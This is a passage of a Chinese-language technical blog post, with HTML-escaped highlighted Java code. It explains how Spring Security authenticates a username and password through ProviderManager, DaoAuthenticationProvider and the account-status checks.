&lt;span style="color:#75715e">// Allow subclasses to set the &amp;#34;details&amp;#34; property
&lt;/span>&lt;span style="color:#75715e">&lt;/span> setDetails&lt;span style="color:#f92672">(&lt;/span>request&lt;span style="color:#f92672">,&lt;/span> authRequest&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#75715e">// 将用户名与密码交由 AuthenticationManager() 进行认证。
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getAuthenticationManager&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#a6e22e">authenticate&lt;/span>&lt;span style="color:#f92672">(&lt;/span>authRequest&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="providermanager-authenticate">ProviderManager. authenticate()&lt;/h2>
&lt;p>ProviderManager 自己并不会执行身份认证。它会将请求委托给被他管理的一系列 AuthenticationProvider 集合。AuthenticationProvider 集合中包含一个名为 DaoAuthenticationProvider 的 Provider ，专门负责处理基于 UsernamePasswordAuthenticationToken 的认证请求。&lt;/p>
&lt;h3 id="daoauthenticationprovidersupports">DaoAuthenticationProvider.supports()&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java"> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">boolean&lt;/span> &lt;span style="color:#a6e22e">supports&lt;/span>&lt;span style="color:#f92672">(&lt;/span>Class&lt;span style="color:#f92672">&amp;lt;?&amp;gt;&lt;/span> authentication&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#f92672">(&lt;/span>UsernamePasswordAuthenticationToken&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">class&lt;/span>
&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">isAssignableFrom&lt;/span>&lt;span style="color:#f92672">(&lt;/span>authentication&lt;span style="color:#f92672">));&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">
&lt;span style="color:#66d9ef">public&lt;/span> Authentication &lt;span style="color:#a6e22e">authenticate&lt;/span>&lt;span style="color:#f92672">(&lt;/span>Authentication authentication&lt;span style="color:#f92672">)&lt;/span>
&lt;span style="color:#66d9ef">throws&lt;/span> AuthenticationException &lt;span style="color:#f92672">{&lt;/span>
Class&lt;span style="color:#f92672">&amp;lt;?&lt;/span> &lt;span style="color:#66d9ef">extends&lt;/span> Authentication&lt;span style="color:#f92672">&amp;gt;&lt;/span> toTest &lt;span style="color:#f92672">=&lt;/span> authentication&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getClass&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
AuthenticationException lastException &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
AuthenticationException parentException &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
Authentication result &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
Authentication parentResult &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#66d9ef">boolean&lt;/span> debug &lt;span style="color:#f92672">=&lt;/span> logger&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">isDebugEnabled&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#66d9ef">for&lt;/span> &lt;span style="color:#f92672">(&lt;/span>AuthenticationProvider provider &lt;span style="color:#f92672">:&lt;/span> getProviders&lt;span style="color:#f92672">())&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(!&lt;/span>provider&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">supports&lt;/span>&lt;span style="color:#f92672">(&lt;/span>toTest&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">continue&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>debug&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
logger&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">debug&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;Authentication attempt using &amp;#34;&lt;/span>
&lt;span style="color:#f92672">+&lt;/span> provider&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getClass&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#a6e22e">getName&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
result &lt;span style="color:#f92672">=&lt;/span> provider&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">authenticate&lt;/span>&lt;span style="color:#f92672">(&lt;/span>authentication&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>result &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
copyDetails&lt;span style="color:#f92672">(&lt;/span>authentication&lt;span style="color:#f92672">,&lt;/span> result&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#66d9ef">break&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>AccountStatusException &lt;span style="color:#f92672">|&lt;/span> InternalAuthenticationServiceException e&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
prepareException&lt;span style="color:#f92672">(&lt;/span>e&lt;span style="color:#f92672">,&lt;/span> authentication&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#75715e">// SEC-546: Avoid polling additional providers if auth failure is due to
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// invalid account status
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">throw&lt;/span> e&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#66d9ef">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>AuthenticationException e&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
lastException &lt;span style="color:#f92672">=&lt;/span> e&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>result &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> parent &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#75715e">// Allow the parent to try.
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
result &lt;span style="color:#f92672">=&lt;/span> parentResult &lt;span style="color:#f92672">=&lt;/span> parent&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">authenticate&lt;/span>&lt;span style="color:#f92672">(&lt;/span>authentication&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>ProviderNotFoundException e&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#75715e">// ignore as we will throw below if no other exception occurred prior to
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// calling parent and the parent
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// may throw ProviderNotFound even though a provider in the child already
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// handled the request
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>AuthenticationException e&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
lastException &lt;span style="color:#f92672">=&lt;/span> parentException &lt;span style="color:#f92672">=&lt;/span> e&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>result &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>eraseCredentialsAfterAuthentication
&lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#f92672">(&lt;/span>result &lt;span style="color:#66d9ef">instanceof&lt;/span> CredentialsContainer&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#75715e">// Authentication is complete. Remove credentials and other secret data
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// from authentication
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">((&lt;/span>CredentialsContainer&lt;span style="color:#f92672">)&lt;/span> result&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#a6e22e">eraseCredentials&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#75715e">// If the parent AuthenticationManager was attempted and successful than it will publish an AuthenticationSuccessEvent
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// This check prevents a duplicate AuthenticationSuccessEvent if the parent AuthenticationManager already published it
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>parentResult &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
eventPublisher&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">publishAuthenticationSuccess&lt;/span>&lt;span style="color:#f92672">(&lt;/span>result&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> result&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#75715e">// Parent was null, or didn&amp;#39;t authenticate (or throw an exception).
&lt;/span>&lt;span style="color:#75715e">&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>lastException &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
lastException &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> ProviderNotFoundException&lt;span style="color:#f92672">(&lt;/span>messages&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getMessage&lt;/span>&lt;span style="color:#f92672">(&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;ProviderManager.providerNotFound&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span>
&lt;span style="color:#66d9ef">new&lt;/span> Object&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#f92672">{&lt;/span> toTest&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getName&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">},&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;No AuthenticationProvider found for {0}&amp;#34;&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#75715e">// If the parent AuthenticationManager was attempted and failed than it will publish an AbstractAuthenticationFailureEvent
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// This check prevents a duplicate AbstractAuthenticationFailureEvent if the parent AuthenticationManager already published it
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>parentException &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
prepareException&lt;span style="color:#f92672">(&lt;/span>lastException&lt;span style="color:#f92672">,&lt;/span> authentication&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">throw&lt;/span> lastException&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="abstractuserdetailsauthenticationproviderauthenticate">AbstractUserDetailsAuthenticationProvider.authenticate()&lt;/h2>
&lt;p>DaoAuthenticationProvider 的设计也运用了模板方法设计模式——authenticate 模板方法定义在了父类 AbstractUserDetailsAuthenticationProvider ，而具体的认证逻辑细节都通过子类 DaoAuthenticationProvider 来实现。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">
&lt;span style="color:#66d9ef">public&lt;/span> Authentication &lt;span style="color:#a6e22e">authenticate&lt;/span>&lt;span style="color:#f92672">(&lt;/span>Authentication authentication&lt;span style="color:#f92672">)&lt;/span>
&lt;span style="color:#66d9ef">throws&lt;/span> AuthenticationException &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#75715e">// 1 - A 检索用户
&lt;/span>&lt;span style="color:#75715e">&lt;/span> user &lt;span style="color:#f92672">=&lt;/span> retrieveUser&lt;span style="color:#f92672">(&lt;/span>username&lt;span style="color:#f92672">,(&lt;/span>UsernamePasswordAuthenticationToken&lt;span style="color:#f92672">)&lt;/span> authentication&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#75715e">// 2 - B 检查用户状态是否有效
&lt;/span>&lt;span style="color:#75715e">&lt;/span> preAuthenticationChecks&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">check&lt;/span>&lt;span style="color:#f92672">(&lt;/span>user&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#75715e">// 3 - C 用户认证
&lt;/span>&lt;span style="color:#75715e">&lt;/span> additionalAuthenticationChecks&lt;span style="color:#f92672">(&lt;/span>user&lt;span style="color:#f92672">,&lt;/span>
&lt;span style="color:#f92672">(&lt;/span>UsernamePasswordAuthenticationToken&lt;span style="color:#f92672">)&lt;/span> authentication&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>AuthenticationException exception&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>cacheWasUsed&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#75715e">// There was a problem, so try again after checking
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// we&amp;#39;re using latest data (i.e. not from the cache)
&lt;/span>&lt;span style="color:#75715e">&lt;/span> cacheWasUsed &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">false&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
user &lt;span style="color:#f92672">=&lt;/span> retrieveUser&lt;span style="color:#f92672">(&lt;/span>username&lt;span style="color:#f92672">,&lt;/span>
&lt;span style="color:#f92672">(&lt;/span>UsernamePasswordAuthenticationToken&lt;span style="color:#f92672">)&lt;/span> authentication&lt;span style="color:#f92672">);&lt;/span>
preAuthenticationChecks&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">check&lt;/span>&lt;span style="color:#f92672">(&lt;/span>user&lt;span style="color:#f92672">);&lt;/span>
additionalAuthenticationChecks&lt;span style="color:#f92672">(&lt;/span>user&lt;span style="color:#f92672">,&lt;/span>
&lt;span style="color:#f92672">(&lt;/span>UsernamePasswordAuthenticationToken&lt;span style="color:#f92672">)&lt;/span> authentication&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">throw&lt;/span> exception&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
postAuthenticationChecks&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">check&lt;/span>&lt;span style="color:#f92672">(&lt;/span>user&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(!&lt;/span>cacheWasUsed&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">userCache&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">putUserInCache&lt;/span>&lt;span style="color:#f92672">(&lt;/span>user&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
Object principalToReturn &lt;span style="color:#f92672">=&lt;/span> user&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>forcePrincipalAsString&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
principalToReturn &lt;span style="color:#f92672">=&lt;/span> user&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getUsername&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> createSuccessAuthentication&lt;span style="color:#f92672">(&lt;/span>principalToReturn&lt;span style="color:#f92672">,&lt;/span> authentication&lt;span style="color:#f92672">,&lt;/span> user&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="daoauthenticationprovider-retrieveuser">DaoAuthenticationProvider. retrieveUser()&lt;/h2>
&lt;p>检索用户功能是通过返回一个 UserDetails 对象 loadUserByUsername 方法来完成的。UserDetails 是一个接口，其中规范了使用 spring security 时用户对象应该遵守的行为和至少应该具备的字段。这是通过 UserDetails 的一系列行为的返回值来决定的。这也意味着你可以自定义这些行为，来决定一个用户是否有效——这是面向接口而不是面向实现的典型案例，言下之意你的用户实体需要实现 UserDetails 与 loadUserByUsername。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">&lt;span style="color:#75715e">// A
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#66d9ef">protected&lt;/span> &lt;span style="color:#66d9ef">final&lt;/span> UserDetails &lt;span style="color:#a6e22e">retrieveUser&lt;/span>&lt;span style="color:#f92672">(&lt;/span>String username&lt;span style="color:#f92672">,&lt;/span>
UsernamePasswordAuthenticationToken authentication&lt;span style="color:#f92672">)&lt;/span>
&lt;span style="color:#66d9ef">throws&lt;/span> AuthenticationException &lt;span style="color:#f92672">{&lt;/span>
prepareTimingAttackProtection&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#66d9ef">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
UserDetails loadedUser &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getUserDetailsService&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#a6e22e">loadUserByUsername&lt;/span>&lt;span style="color:#f92672">(&lt;/span>username&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>loadedUser &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">throw&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> InternalAuthenticationServiceException&lt;span style="color:#f92672">(&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;UserDetailsService returned null, which is an interface contract violation&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> loadedUser&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>UsernameNotFoundException ex&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
mitigateAgainstTimingAttack&lt;span style="color:#f92672">(&lt;/span>authentication&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#66d9ef">throw&lt;/span> ex&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>InternalAuthenticationServiceException ex&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">throw&lt;/span> ex&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>Exception ex&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">throw&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> InternalAuthenticationServiceException&lt;span style="color:#f92672">(&lt;/span>ex&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getMessage&lt;/span>&lt;span style="color:#f92672">(),&lt;/span> ex&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="accountstatususerdetailschecker-check">AccountStatusUserDetailsChecker. check()&lt;/h2>
&lt;p>由于定义了用户对象的行为和字段标准，检查用户是否有效的功能自然也就可以提供了。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">AccountStatusUserDetailsChecker&lt;/span> &lt;span style="color:#66d9ef">implements&lt;/span> UserDetailsChecker&lt;span style="color:#f92672">,&lt;/span> MessageSourceAware &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">protected&lt;/span> MessageSourceAccessor messages &lt;span style="color:#f92672">=&lt;/span> SpringSecurityMessageSource
&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getAccessor&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#75715e">// B
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">check&lt;/span>&lt;span style="color:#f92672">(&lt;/span>UserDetails user&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(!&lt;/span>user&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">isAccountNonLocked&lt;/span>&lt;span style="color:#f92672">())&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">throw&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> LockedException&lt;span style="color:#f92672">(&lt;/span>messages&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getMessage&lt;/span>&lt;span style="color:#f92672">(&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;AccountStatusUserDetailsChecker.locked&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#e6db74">&amp;#34;User account is locked&amp;#34;&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(!&lt;/span>user&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">isEnabled&lt;/span>&lt;span style="color:#f92672">())&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">throw&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> DisabledException&lt;span style="color:#f92672">(&lt;/span>messages&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getMessage&lt;/span>&lt;span style="color:#f92672">(&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;AccountStatusUserDetailsChecker.disabled&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#e6db74">&amp;#34;User is disabled&amp;#34;&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(!&lt;/span>user&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">isAccountNonExpired&lt;/span>&lt;span style="color:#f92672">())&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">throw&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> AccountExpiredException&lt;span style="color:#f92672">(&lt;/span>
messages&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getMessage&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;AccountStatusUserDetailsChecker.expired&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;User account has expired&amp;#34;&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(!&lt;/span>user&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">isCredentialsNonExpired&lt;/span>&lt;span style="color:#f92672">())&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">throw&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> CredentialsExpiredException&lt;span style="color:#f92672">(&lt;/span>messages&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getMessage&lt;/span>&lt;span style="color:#f92672">(&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;AccountStatusUserDetailsChecker.credentialsExpired&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;User credentials have expired&amp;#34;&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="daoauthenticationprovideradditionalauthenticationchecks">DaoAuthenticationProvider.additionalAuthenticationChecks()&lt;/h2>
&lt;p>additionalAuthenticationChecks 方法通过将 UsernamePasswordAuthenticationToken 封装的用户密码与检索出来的用户对象通过加密工具进行匹配来完成认证逻辑。&lt;/p>
